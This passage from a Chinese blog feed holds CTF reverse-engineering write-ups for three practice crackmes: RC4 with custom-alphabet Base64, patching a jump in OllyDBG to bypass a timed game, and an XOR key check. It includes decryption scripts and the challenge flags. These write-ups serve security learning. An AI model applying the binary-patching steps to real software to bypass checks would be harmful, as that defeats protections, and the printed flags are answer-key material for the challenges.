operator">&amp;</span> <span class="token number">0x80808080</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span>a1 <span class="token punctuation">)</span>          <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">-</span> v1<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>          <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">-</span> v1 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>a1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>          <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">-</span> v1 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>a1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>          <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">-</span> v1 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      a1 <span class="token operator">+=</span> <span class="token number">4</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></code></pre><p>这个函数的作用应该是计算字符串的长度，即 <code>strlen()</code></p></li><li><p>然后函数 <code>sub_4009DC()</code> 对 v3 进行了处理，继续跟进<br><img src="https://s2.loli.net/2023/03/18/qXuiWwOp7CvH1EU.png" alt="攻防世界-ereere4.png"><br>在函数最开始，首先调用了 <code>sub_400864()</code>，跟进<br><img src="https://s2.loli.net/2023/03/18/rgv74J1Bfw2FdxE.png" alt="攻防世界-ereere5.png"><br>可以看到两个 256 的 for 循环（<mark>十六进制的 0x100 就是十进制的 256</mark>）<br>并且第一个 for 循环仅赋值，第二个 for 循环有 swap 操作<br>再结合 <code>sub_4009DC()</code> 后面部分的一个 for 循环、余 256、一个 swap 操作和一个异或操作<br>可以明显得知这是 RC4 算法的特征<br><code>sub_400864()</code> 做 s 盒的初始化操作，即 rc4_init<br><code>sub_4009DC()</code> 做加解密操作，即 rc4_crypt</p></li><li><p>根据 RC4 算法的特点，可知 <code>byte_4A0860[]</code> 为 <code>s_box</code>，<code>aFlag1233213211[]</code> 为 <code>Key</code><br>同时得到 <code>aFlag1233213211[]</code> 的内容：<code>flag&#123;123321321123badbeef012&#125;</code><br><img src="https://s2.loli.net/2023/03/18/sEHqM5zGCm9xUJo.png" alt="攻防世界-ereere6.png"></p></li><li><p>回到主函数 <code>sub_400BC8()</code> 中，在 RC4 算法之后，函数 <code>sub_400550()</code> 又对 <code>v3</code> 做了处理，跟进<br><img src="https://s2.loli.net/2023/03/18/WsaCU2F3x6MZeXT.png" alt="攻防世界-ereere7.png"><br>发现多次对数组 <code>aZyxwvutsrqponm[]</code> 的索引操作，且 <code>aZyxwvutsrqponm[]</code> 的内容：<br><img src="https://s2.loli.net/2023/03/18/wEt7aTGpRiJogul.png" alt="攻防世界-ereere8.png"><br><code>ZYXWVUTSRQPONMLKJIHGFEDCBAabcdefghijklmnopqrstuvwxyz/+9876543210</code>，神似 Base64 的密码表<br>再结合每次赋值的偏移操作，如：<code>*(_BYTE *)(v13 + v3)</code> 等<br>以及 if 判断语句中：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">&lt;</span> <span class="token number">2</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v13 <span class="token operator">+</span> v11<span class="token punctuation">)</span> <span class="token operator">=</span> aZyxwvutsrqponm<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> <span class="token operator">*</span>v8<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x30</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v13 <span class="token operator">+</span> v11 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">61</span><span class="token punctuation">;</span>      v6 <span class="token operator">=</span> v11 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">;</span>      v10 <span class="token operator">=</span> v11 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v13 <span class="token operator">+</span> v6<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">61</span><span class="token punctuation">;</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></code></pre><p>在 <code>i &lt; 2</code> 的条件下，存在两次赋值 ‘&#x3D;’ 的操作（<mark>61 是 ‘&#x3D;’ 的 ASCii 码</mark>）<br>这些都是 Base64 加密的特点，可以推知函数  <code>sub_400550()</code> 是一个更换了原始码表的 Base64 算法</p></li><li><p>也就是说，本题是将 flag 进行 RC4 加密后，再进行更换码表的 Base64 加密，最终加密结果为：<br><code>ScDZC1cNDZaxnh/2eW1UdqaCiJ0ijRIExlvVEgP43rpxoxbYePBhpwHDPJ==</code></p></li><li><p>先进行更换码表的 Base64 解密，再进行 RC4 解密，即可得到 flag</p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><h3 id="Python（引用-Python-库）"><a href="#Python（引用-Python-库）" class="headerlink" title="Python（引用 Python 库）"></a>Python（引用 Python 库）</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> ARC4key <span class="token operator">=</span> <span class="token string">"ScDZC1cNDZaxnh/2eW1UdqaCiJ0ijRIExlvVEgP43rpxoxbYePBhpwHDPJ=="</span>string1 <span class="token operator">=</span> <span class="token string">"ZYXWVUTSRQPONMLKJIHGFEDCBAabcdefghijklmnopqrstuvwxyz/+9876543210"</span>  <span class="token comment"># string1表示更换后的码表</span>string2 <span class="token operator">=</span> <span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span>  <span class="token comment"># string2表示原始码表</span>Str <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>key<span class="token punctuation">.</span>translate<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>maketrans<span class="token punctuation">(</span>string1<span class="token punctuation">,</span> string2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># Base64解密，bytes型</span>aFlag1233213211 <span class="token operator">=</span> <span class="token string">"flag&#123;123321321123badbeef012&#125;"</span>flag <span class="token operator">=</span> ARC4<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>aFlag1233213211<span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>Str<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre><h3 id="Python（完整实现）"><a href="#Python（完整实现）" class="headerlink" title="Python（完整实现）"></a>Python（完整实现）</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64flag <span class="token operator">=</span> <span class="token string">""</span>key <span class="token operator">=</span> <span class="token string">"ScDZC1cNDZaxnh/2eW1UdqaCiJ0ijRIExlvVEgP43rpxoxbYePBhpwHDPJ=="</span>string1 <span class="token operator">=</span> <span class="token string">"ZYXWVUTSRQPONMLKJIHGFEDCBAabcdefghijklmnopqrstuvwxyz/+9876543210"</span>  <span class="token comment"># string1表示更换后的码表</span>string2 <span class="token operator">=</span> <span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span>  <span class="token comment"># string2表示原始码表</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Base64还原: "</span><span class="token punctuation">,</span> key<span class="token punctuation">.</span>translate<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>maketrans<span class="token punctuation">(</span>string1<span class="token punctuation">,</span> string2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># 将 key 还原成初始码表加密后的结果</span>Str <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>key<span class="token punctuation">.</span>translate<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>maketrans<span class="token punctuation">(</span>string1<span class="token punctuation">,</span> string2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># Base64解密，bytes型</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Base64解密: "</span><span class="token punctuation">,</span> Str<span class="token punctuation">)</span>byte_4A0860 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>aFlag1233213211 <span class="token operator">=</span> <span class="token string">"flag&#123;123321321123badbeef012&#125;"</span><span class="token comment"># rc4_init</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    byte_4A0860<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>v4 <span class="token operator">=</span> <span class="token number">0</span>v3 <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    v5 <span class="token operator">=</span> byte_4A0860<span class="token punctuation">[</span>j<span class="token punctuation">]</span>    v3 <span class="token operator">=</span> <span class="token punctuation">(</span>v5 <span class="token operator">+</span> v3 <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>aFlag1233213211<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>j <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>aFlag1233213211<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>    byte_4A0860<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> byte_4A0860<span class="token punctuation">[</span>v3<span class="token punctuation">]</span>    byte_4A0860<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">=</span> v5    v4 <span class="token operator">=</span> v4 <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">if</span> v4 <span class="token operator">>=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>aFlag1233213211<span class="token punctuation">)</span><span class="token punctuation">:</span>        v4 <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"s_box:"</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>byte_4A0860<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># rc4_crypt</span>v4 <span class="token operator">=</span> <span class="token number">0</span>v3 <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>Str<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    v3 <span class="token operator">=</span> <span class="token punctuation">(</span>v3 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>    v4 <span class="token operator">=</span> <span class="token punctuation">(</span>byte_4A0860<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">+</span> v4<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>    v5 <span class="token operator">=</span> byte_4A0860<span class="token punctuation">[</span>v3<span class="token punctuation">]</span>    byte_4A0860<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">=</span> byte_4A0860<span class="token punctuation">[</span>v4<span class="token punctuation">]</span>    byte_4A0860<span class="token punctuation">[</span>v4<span class="token punctuation">]</span> <span class="token operator">=</span> v5    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>Str<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">^</span> byte_4A0860<span class="token punctuation">[</span><span class="token punctuation">(</span>byte_4A0860<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">+</span> byte_4A0860<span class="token punctuation">[</span>v4<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>flag{RC_f0ur_And_Base_s1xty_f0ur_Encrypt_!}</p></blockquote><h3 id="Python（引用-Python-库）-1"><a href="#Python（引用-Python-库）-1" class="headerlink" title="Python（引用 Python 库）"></a>Python（引用 Python 库）</h3><p><img src="https://s2.loli.net/2023/03/18/WtaxYUweDZMhOIm.png" alt="攻防世界-ereere9.png"></p><h3 id="Python（完整实现）-1"><a href="#Python（完整实现）-1" class="headerlink" title="Python（完整实现）"></a>Python（完整实现）</h3><p><img src="https://s2.loli.net/2023/03/18/4ycDCIZvirwkRLX.png" alt="攻防世界-ereere10.png"></p>]]></content>
      
      
      <categories>
          
          <category> 逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF刷题 </tag>
            
            <tag> REVERSE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-gametime</title>
      <link href="/2023/03988ed2e4.html"/>
      <url>/2023/03988ed2e4.html</url>
      
        <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p>结合程序运行、IDA 和 OllyDBG 分析程序的逻辑</p></li><li><p><mark>使用 OllyDBG 修改程序跳转逻辑</mark></p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/challenges/details?hash=a1e2802b-9a62-4091-a053-7661e8c413c9_2&task_category_id=4">攻防世界-gametime</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>将文件拖入 exeinfo 查看，为 32 位程序<br>   <img src="https://s2.loli.net/2023/03/18/d9A8N63mrg1OvRw.png" alt="攻防世界-gametime1.png"></p></li><li><p>运行程序可知是一个游戏，根据提示的内容：“当看到 s 的时候，按下空格键”<br><img src="https://s2.loli.net/2023/03/18/Bxj1CA9OJvKLFS7.png" alt="攻防世界-gametime2.png"><br>按照游戏要求输入，发现游戏规为：当看到 s 的时候，按下 ‘ ‘；当看到 x 的时候，按下 ‘x’；当看到 m 的时候，按下 ‘m’<br>但进行到 <code>TRAINING COMPLETE!</code> 后，速度开始越来越快</p></li><li><p>IDA 查看主函数：<br><img src="https://s2.loli.net/2023/03/18/oSMi3NGuxnPcvjK.png" alt="攻防世界-gametime3.png"><br>最开始是一段屏幕输出，后面有两组三条 if 判断语句，根据游戏的规则，猜测这两组 if 语句应该是用来检测用户的输入是否对应为：’ ‘、’x’、’m’<br>除此之外，发现第一组三条 if 语句在输出 <code>TRAINING COMPLETE!</code> 之前，而第二组三条 if 语句在输出 <code>TRAINING COMPLETE!</code> 之后。前面一组判断速度比较慢，可以直接输入；但后面一组判断速度很快，输入正确有难度<br>最后面一片代码应该就是对 flag 的处理，输出 flag</p></li><li><p>查看判断函数：<br><img src="https://s2.loli.net/2023/03/18/OZqirjUpIusQfRt.png" alt="攻防世界-gametime4.png"><br>为了不让程序结束，根据 main 中：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">sub_401507</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token char">' '</span><span class="token punctuation">,</span> <span class="token number">0xC8u</span><span class="token punctuation">,</span> v25<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v23<span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">sub_401507</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token char">'x'</span><span class="token punctuation">,</span> <span class="token number">0xC8u</span><span class="token punctuation">,</span> v25<span class="token punctuation">,</span> v25<span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">sub_401507</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token char">'m'</span><span class="token punctuation">,</span> <span class="token number">0xC8u</span><span class="token punctuation">,</span> v25<span class="token punctuation">,</span> v25<span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></code></pre><p>可知，必须让 <code>sub_401507()</code> 返回 非0，即 <code>sub_401507()</code> 执行 return 1<br>根据 <code>if ( sub_401260(a2, 500 * dwMilliseconds) )</code>，即让此判断恒为真</p></li><li><p>结合游戏发现，当用户输入错误时，会输出：<code>UDDER FAILURE! http://imgur.com/4Ajx21P \n</code>，即：用户输入正确时，<code>sub_401260(a2, 500 * dwMilliseconds)</code> 非0，执行 <code>if ( sub_401260(a2, 500 * dwMilliseconds) )</code>，判断函数 <code>sub_401507()</code> 返回 1，从而跳过 <code>if ( !sub_401507(5, &#39; &#39;, 0xC8u, v25, &amp;v23) )</code>，使程序继续执行下去；若输入错误，则输出 <code>UDDER FAILURE! http://imgur.com/4Ajx21P \n</code>，程序终止</p></li><li><p>由于游戏速度太快，很难输入正确，于是想通过修改 <code>if ( sub_401260(a2, 500 * dwMilliseconds) )</code> 判断语句，让用户输入错误时，使程序继续执行</p></li><li><p>用 OllyDBG 打开，首先定位到刚刚的输入错误语句：<code>UDDER FAILURE! http://imgur.com/4Ajx21P \n</code><br><img src="https://s2.loli.net/2023/03/18/lKWtkT1UE9NbMrX.png" alt="攻防世界-gametime5.png"><br>发现前面的一个 jnz 跳转语句<br><img src="https://s2.loli.net/2023/03/18/cTOJ8LDZm5bajqS.png" alt="攻防世界-gametime6.png"><br>跟随该跳转地址：<code>000E1586</code><br><img src="https://s2.loli.net/2023/03/18/jyAQ5zWfedhVHac.png" alt="攻防世界-gametime7.png"><br>功能为：给 <code>al</code> 赋值为 1，然后结束调用，对应 “return 1”<br>所以这里的 <code>jnz</code> 跳转控制的就是 <code>if ( sub_401260(a2, 500 * dwMilliseconds) )</code> 语句的执行<br>原来的逻辑是，输入正确则执行 if 语句，用 <code>jnz</code> 控制跳转<br>要想将逻辑改为，输入错误则执行 if 语句，将 <code>jnz</code> 跳转改为 <code>je</code> 跳转即可<br><img src="https://s2.loli.net/2023/03/18/TL24mEpBFkau89z.png" alt="攻防世界-gametime8.png"></p></li><li><p>同理，将另外一组跳转也修改掉，在 OllyDBG 中执行程序，<strong>只要输入错误即可</strong>，比如一直按回车：<br><img src="https://s2.loli.net/2023/03/18/X1hb6lUe8JOS3mv.png" alt="攻防世界-gametime9.png"><br>等待程序执行自动输出 flag 即可</p></li></ol><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>no5c30416d6cf52638460377995c6a8cf5</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF刷题 </tag>
            
            <tag> REVERSE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-logmein</title>
      <link href="/2023/03607cb538.html"/>
      <url>/2023/03607cb538.html</url>
      
        <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p>熟悉<mark>大端序、小端序</mark>存放方式</p></li><li><p>找一下如果 IDA 反编译出的伪代码有问题时，有没有好的解决办法</p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/challenges/details?hash=029ca36e-966c-4328-9e88-baf47e35ae03_2&task_category_id=4">攻防世界-logmein</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>将得到的 64位 elf 文件拖入 IDA<br><img src="https://s2.loli.net/2023/03/18/OSAjWMXgiDT1cd4.png" alt="攻防世界-logmein1.png"></p></li><li><p>逻辑很简单，<code>sub_4007C0()</code> 函数用来提示输入错误并结束程序，执行 <code>sub_4007F0()</code> 就代表破解成功</p></li><li><p>而通过</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v8<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token function">sub_4007C0</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>和</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">>=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v8<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token function">sub_4007C0</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>并且循环条件 i 的范围是 <code>for ( i = 0; i &lt; strlen(s); ++i )</code><br>可以推断输入的字符串 s 的长度 <code>strlen(s) = strlen(v8) = 17</code></p></li><li><p>因此只需满足 <code>s[i] == (char)(v8[i % v6 - 8] ^ v8[i]) 的 s[i]</code> 组成的就是 flag</p></li><li><p>但是这里想半天也没有搞明白 <code>v8[i % v6 - 8]</code> 是个什么写法，第一次循环的时候 <code>i = 0</code>，岂不是 <code>v8[ -8 ]</code> ？</p></li></ol><blockquote><p>后来看网上的 writeup，发现别人反汇编出来的伪代码跟我不一样 … …<br>这就有点恶心了，虽然做题的时候也遇到过好几次这样的情况，但是也找不到好的解决办法<br>别人的伪代码：<br><img src="https://s2.loli.net/2023/03/18/UJje75dkhozu1Zg.png" alt="攻防世界-logmein2.png"><br>这里的条件是：<code>s[i] == (char)(*((_BYTE *)&amp;v7 + i % v6) ^ v8[i]) )</code></p></blockquote><ol start="6"><li><p>注意这里 <code>v7</code> 的定义：</p><pre class="language-c" data-language="c"><code class="language-c">__int64 v7<span class="token punctuation">;</span>v7 <span class="token operator">=</span> <span class="token number">0x65</span> <span class="token number">62</span> <span class="token number">6</span>D <span class="token number">61</span> <span class="token number">72</span> <span class="token number">61</span> <span class="token number">68LL</span><span class="token punctuation">;</span></code></pre><p><mark>v7 的类型为 int64，即 64位 整型，属于 dq 类型的数据，存放时采用 小端序</mark></p></li><li><p>所以 <code>v7</code> 的首地址处存的是 0x68，以此类推：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v7 <span class="token operator">+</span> <span class="token number">0</span> <span class="token operator">%</span> v6<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x68</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v7 <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">%</span> v6<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x61</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v7 <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">%</span> v6<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x72</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v7 <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">%</span> v6<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x61</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v7 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">%</span> v6<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x6D</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v7 <span class="token operator">+</span> <span class="token number">5</span> <span class="token operator">%</span> v6<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x62</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v7 <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">%</span> v6<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x65</span></code></pre></li><li><p>根据 <code>(char)(*((_BYTE *)&amp;v7 + i % v6) ^ v8[i]) )</code> ，求解出 <code>s[i]</code> 并输出，得到 flag</p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    string v8 <span class="token operator">=</span> <span class="token string">":\"AL_RT^L*.?+6/46"</span><span class="token punctuation">;</span>    __int64 v7 <span class="token operator">=</span> <span class="token number">0x65626D61726168LL</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> key<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token number">0x61</span><span class="token punctuation">,</span><span class="token number">0x72</span><span class="token punctuation">,</span><span class="token number">0x61</span><span class="token punctuation">,</span><span class="token number">0x6d</span><span class="token punctuation">,</span><span class="token number">0x62</span><span class="token punctuation">,</span><span class="token number">0x65</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> v9 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>v6 <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">;</span>    string flag <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> v8<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        flag <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i <span class="token operator">%</span> v6<span class="token punctuation">]</span> <span class="token operator">^</span> v8<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cout<span class="token operator">&lt;&lt;</span>flag<span class="token 